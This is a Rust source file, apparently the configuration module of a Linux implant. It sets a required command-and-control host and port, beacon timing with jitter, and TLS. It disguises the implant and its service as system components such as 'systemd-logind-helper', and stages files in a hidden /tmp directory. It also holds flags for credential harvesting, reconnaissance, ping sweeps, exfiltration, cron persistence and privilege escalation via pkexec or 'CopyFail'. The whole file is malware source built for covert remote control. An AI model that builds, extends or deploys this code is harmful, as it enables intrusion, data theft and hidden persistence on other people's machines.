/// Compile-time configuration — all values baked via option_env!().
/// Set by payload-gen at build time; nothing is hardcoded per "tier."

pub struct Config {
    pub c2_host: String,
    pub c2_port: u16,
    pub beacon_interval: u64,
    pub beacon_jitter: u64,

    // Transport
    pub use_tls: bool,

    // Paths
    pub implant_path: String,
    pub staging_dir: String,

    // Process names
    pub worker_name: String,
    pub beacon_name: String,

    // Systemd
    pub service_name: String,
    pub service_description: String,

    // Beacon detection
    pub beacon_env_var: Option<String>,

    // Behavior flags
    pub cleanup_staging: bool,
    pub shell_harvest: bool,
    pub shell_recon: bool,
    pub ping_sweep: bool,
    pub shell_exfil: bool,
    pub print_status: bool,
    pub cron_persist: bool,
    pub escalate_via: EscalateMethod,

    // Pacing
    pub stage_pause_secs: u64,
    pub chunk_pause_secs: u64,
}

#[derive(PartialEq)]
pub enum EscalateMethod {
    Pkexec,
    CopyFail,
    CopyFailFd9,
}

// Compile-time guard: C2_HOST must be set
#[allow(dead_code)]
const _REQUIRE_C2_HOST: () = {
    if option_env!("C2_HOST").is_none() {
        panic!("C2_HOST is required — set it via payload-gen or raw: C2_HOST=10.0.0.1 cargo build");
    }
};

impl Config {
    pub fn load() -> Self {
        let c2_host = option_env!("C2_HOST")
            .expect("C2_HOST is required")
            .to_string();
        let c2_port: u16 = option_env!("C2_PORT")
            .and_then(|s| s.parse().ok())
            .unwrap_or(443);
        let beacon_interval = option_env!("BEACON_RATE")
            .and_then(|s| s.parse().ok())
            .unwrap_or(60);
        let beacon_jitter = option_env!("BEACON_JITTER")
            .and_then(|s| s.parse().ok())
            .unwrap_or(0);
        let use_tls = option_env!("C2_TLS")
            .map(|s| s == "1" || s == "true")
            .unwrap_or(true);
        let worker_name = option_env!("PROCESS_NAME").unwrap_or("system-updater").into();
        let beacon_name = option_env!("BEACON_NAME").unwrap_or("update-checker").into();
        let service_name = option_env!("SERVICE_NAME").unwrap_or("systemd-logind-helper").into();
        let implant_path = option_env!("IMPLANT_PATH").unwrap_or("/usr/bin/dbus-runner").into();

        Config {
            c2_host,
            c2_port,
            beacon_interval,
            beacon_jitter,
            use_tls,
            implant_path,
            staging_dir: "/tmp/.system-update".into(),
            worker_name,
            beacon_name,
            service_name,
            service_description: "System Service Helper".into(),
            beacon_env_var: None,
            cleanup_staging: false,
            shell_harvest: true,
            shell_recon: true,
            ping_sweep: true,
            shell_exfil: true,
            print_status: false,
            cron_persist: false,
            escalate_via: EscalateMethod::CopyFail,
            stage_pause_secs: 3,
            chunk_pause_secs: 5,
        }
    }

    pub fn jitter(&self, range: u64) -> u64 {
        if range == 0 { return 0; }
        let mut buf = [0u8; 8];
        unsafe { libc::getrandom(buf.as_mut_ptr() as *mut libc::c_void, buf.len(), 0); }
        u64::from_le_bytes(buf) % range
    }

    pub fn tier_label(&self) -> &'static str {
        if self.escalate_via == EscalateMethod::Pkexec { "1-loud" }
        else if self.escalate_via == EscalateMethod::CopyFail && self.shell_exfil { "2-mixed" }
        else { "3-stealth" }
    }

    pub fn beacon_sleep(&self) {
        let delay = self.jitter(self.beacon_jitter);
        if delay == 0 { return; }
        let ts = libc::timespec { tv_sec: delay as _, tv_nsec: 0 };
        unsafe { libc::nanosleep(&ts, std::ptr::null_mut()); }
    }

    pub fn implant_id(&self) -> String {
        let hostname = std::fs::read_to_string("/proc/sys/kernel/hostname")
            .unwrap_or_default().trim().to_string();
        let mac = first_mac().unwrap_or_else(|| "unknown".into());
        format!("{}-{}", hostname, mac.replace(':', "-"))
    }

    pub fn get_os_info(&self) -> String {
        std::fs::read_to_string("/etc/os-release")
            .ok()
            .and_then(|s| {
                s.lines()
                    .find(|l| l.starts_with("PRETTY_NAME="))
                    .map(|l| l.trim_start_matches("PRETTY_NAME=").trim_matches('"').to_string())
            })
            .unwrap_or_else(|| "Linux".into())
    }
}

fn first_mac() -> Option<String> {
    if let Ok(entries) = std::fs::read_dir("/sys/class/net") {
        for entry in entries.flatten() {
            let addr_path = entry.path().join("address");
            if let Ok(mac) = std::fs::read_to_string(&addr_path) {
                let mac = mac.trim().to_string();
                if !mac.is_empty() && mac != "00:00:00:00:00:00" {
                    return Some(mac);
                }
            }
        }
    }
    None
}
